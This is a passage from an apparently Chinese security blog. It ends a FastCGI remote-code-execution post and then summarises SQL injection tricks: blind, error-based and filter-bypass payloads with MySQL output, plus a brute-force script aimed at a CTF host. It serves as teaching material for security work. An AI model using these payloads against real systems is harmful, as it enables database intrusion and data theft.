&#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul>
<li>网站对外开放9000端口。</li>
<li>有一个php文件的绝对路径。</li>
</ul>
<p>其实如果网站没有开放<code>9000</code>端口的话，我们也是可以通过<code>ssrf</code>配合<code>gopher</code>去攻击内网的<code>Fastcgi</code>应用的(详见下期博客hh</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://p0sec.net/index.php/archives/69/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/69/</a></p>
<p><a href="https://xz.aliyun.com/t/4051#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/4051#toc-7</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><a href="http://www.php.cn/php-weizijiaocheng-392861.html" target="_blank" rel="noopener">http://www.php.cn/php-weizijiaocheng-392861.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="ckabsu38h001skkvr2jbc1ixv" class="article-share-link" data-share="baidu" data-title="Redis&amp;Fastcgi未授权访问漏洞">Share</a>
      

      
        <a href="http://yoursite.com/2019/06/30/Redis-Fastcgi%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SQL注入有趣姿势总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2019-06-28T23:12:56.000Z" itemprop="datePublished">2019-06-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/29/SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E8%B6%A3%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">SQL注入有趣姿势总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>文章首发于先知</p>
<h3 id="五种时间盲注姿势"><a href="#五种时间盲注姿势" class="headerlink" title="五种时间盲注姿势"></a>五种时间盲注姿势</h3><ul>
<li><strong>sleep()函数</strong></li>
<li><strong>benchmark函数</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br><a href="https://imgchr.com/i/ZZi7GR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZi7GR.md.png" alt="ZZi7GR.md.png"></a></p>
<p>可以看到通过重复计算延时了<code>1.90s</code></p>
<ul>
<li><strong>笛卡尔积盲注</strong></li>
</ul>
<p>注入姿势</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>利用<code>and短路运算规则</code>进行时间盲注。</p>
<ul>
<li><strong>GET_LOCK盲注</strong></li>
</ul>
<p><code>get_lock</code>函数官方文档中的介绍</p>
<p><a href="https://imgchr.com/i/ZZAQbT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png" alt="ZZAQbT.md.png"></a></p>
<p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p>
<p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p>
<p><code>SESSION A</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><code>SESSION B</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#39;lihuaiqiu&#39;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>同样的盲注利用手法。</p>
<ul>
<li><strong>正则<code>DOS</code> RLIKE注入</strong></li>
</ul>
<p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p>
<p>利用手法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#39;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p>
<ul>
<li><strong>mysql列名重复报错</strong></li>
</ul>
<p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p>
<p>Name_const函数用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1);</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.47 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>报错用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1),name_const(version(),1);;</span><br><span class="line">+--------+--------+</span><br><span class="line">| 5.5.47 | 5.5.47 |</span><br><span class="line">+--------+--------+</span><br><span class="line">|      1 |      1 |</span><br><span class="line">+--------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select name_const(version(),1),name_const(version(),1))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;5.5.47&#39;</span><br></pre></td></tr></table></figure>

<p>不过这个有很大的限制，<code>version()</code>所多应的值必须是常量，而我们所需要的<code>database()</code>和<code>user()</code>都是变量，无法通过报错得出，但是我们可以利用这个原理配合join函数得到列名。</p>
<p>用法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test a join ctf_test b;</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| user | pwd          | user | pwd          |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">| 1    | 0            | 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 1    | 0            |</span><br><span class="line">| 1    | 0            | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; | 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b )x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;user&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user))x;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;pwd&#39;</span><br><span class="line">mysql&gt; select * from (select * from ctf_test a join ctf_test b using(user,pwd))x;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 1    | 0            |</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>xpath语法报错与整数溢出报错的区别</strong></li>
</ul>
<p>xpath报错注入中，我们经常用的语法有<code>updatexml</code>和<code>extractvalue</code>函数，同样是报错注入，那么在使用中有什么区别？</p>
<p>例子：<strong>第12届全国大学生信息安全竞赛全宇宙最简单的SQL</strong></p>
<p>如果二者的区别认知不太清楚，很可能导致卡在这个点上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and updatexml(1,concat(0x7e,(select database()),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and pow(999,999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(999,999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and pow(999,999);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>从上面的实验中可以得出如果在sql语句中有出现语法错误，则会直接报错，不会被and短路运算所影响，如果是大数溢出报错，则会遵循and短路运算规则</strong>。所以可以利用大数溢出这个问题结合前面的1=0的判断条件进行布尔盲注。</p>
<ul>
<li><strong>整数溢出报错函数</strong></li>
</ul>
<p>pow(),cot(),exp()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and cot(0);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and pow(988888,999999);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(988888,999999)&#39;</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and 1&#x3D;1 and exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用几何函数进行报错注入</strong></li>
</ul>
<p>几何函数进行报错注入，如<code>polygon()</code>,<code>linestring()</code>函数等，姿势如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and polygon(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and linestring(user);</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#39;&#96;test&#96;.&#96;ctf_test&#96;.&#96;user&#96;&#39; value found during parsing</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>对于insert,delete,update三种操作的注入</strong></li>
</ul>
<p>对于select类型操作其实是最常见，最容易上手的，但insert,delete,update三种操作的注入也很重要，下面是总结的这三种注入的操作姿势。</p>
<p><strong>报错注入</strong></p>
<p>insert报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&#39;,&#39;2&#39;);</span><br></pre></td></tr></table></figure>

<p>update报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update ctf_test set user&#x3D;1 where pwd&#x3D;&#39;2&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br></pre></td></tr></table></figure>

<p>delete报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete from ctf_test where user&#x3D;&#39;1&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;&#39;;</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39;</span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<p>insert类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into ctf_test(&#96;user&#96;,&#96;pwd&#96;) value(&#39;1&#39; and sleep(3) and &#39;&#39;,&#39;2&#39;);</span><br><span class="line">Query OK, 1 row affected (3.00 sec)</span><br></pre></td></tr></table></figure>

<p>delete和update也都是一样的，就不一 一列举了。</p>
<h3 id="另类注入姿势以及对关键词过滤的绕过"><a href="#另类注入姿势以及对关键词过滤的绕过" class="headerlink" title="另类注入姿势以及对关键词过滤的绕过"></a>另类注入姿势以及对关键词过滤的绕过</h3><ul>
<li><code>order by</code> 盲注</li>
</ul>
<p>题目例子：ISCC web5</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg" alt="img"></p>
<p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p>
<p>web5对应脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://39.100.83.188:8054/'</span></span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>:<span class="string">"lihuaiqiu Union.373"</span>&#125;</span><br><span class="line">payload=<span class="string">"union_373_Tom' union select 1,2,0x&#123;&#125; order by 3,2,'1"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        data=&#123;<span class="string">"username"</span>:payload.format((flag+chr(j)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'233'</span>&#125;</span><br><span class="line">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"union_373_Tom"</span> in lihuaiqiu.text:</span><br><span class="line">            flag+=chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>MySQL数据库的Innodb引擎的注入</strong></li>
</ul>
<p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p>
<p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p>
<p>所以可以通过查找这两个表取代information的作用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database();</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag&#x3D;1 union select group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;database();</span><br><span class="line">+----------------+</span><br><span class="line">| flag           |</span><br><span class="line">+----------------+</span><br><span class="line">| 1              |</span><br><span class="line">| flag,flag,flag |</span><br><span class="line">+----------------+</span><br><span class="line">2 rows in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>无列名注入</li>
</ul>
<p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p>
<p><a href="https://imgchr.com/i/ZZgHQU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png" alt="ZZgHQU.md.png"></a></p>
<ul>
<li>异或注入</li>
</ul>
<p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;s&#39;)^1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39;^(mid(user(),1,1)&#x3D;&#39;r&#39;)^1;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>同等功能替换</li>
</ul>
<p>空格绕过：%0a,/**/.</p>
<p>关键函数过滤：</p>
<p>substr等价于left ,mid,substring</p>
<p>group_concat等价于concat_ws</p>
<ul>
<li>逗号被过滤</li>
</ul>
<p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p>
<p><strong>union select 逗号被过滤掉</strong></p>
<p>利用join注入，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; union select * from (select 1)a join (select 2)b;</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">| 1    | 2            |</span><br><span class="line">+------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>功能函数逗号被过滤</strong></p>
<p>利用<code>from...for...</code>进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;r&#39;,1,0);</span><br><span class="line">+------+--------------+</span><br><span class="line">| user | pwd          |</span><br><span class="line">+------+--------------+</span><br><span class="line">| 2    | flag&#123;OK_t72&#125; |</span><br><span class="line">+------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user&#x3D;&#39;2&#39; and if(mid((select user()) from 1 for 1)&#x3D;&#39;s&#39;,1,0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>limit中逗号被过滤</strong></p>
<p>利用<code>limit..offset</code>进行绕过</p>
<p><code>limit 9 offset 4</code>表示从第十行开始返回4行，返回的是<code>10,11,12,13</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 0;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema&#x3D;database() limit 1 offset 1;</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| ctf_test   |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>等于号被过滤</strong></li>
</ul>
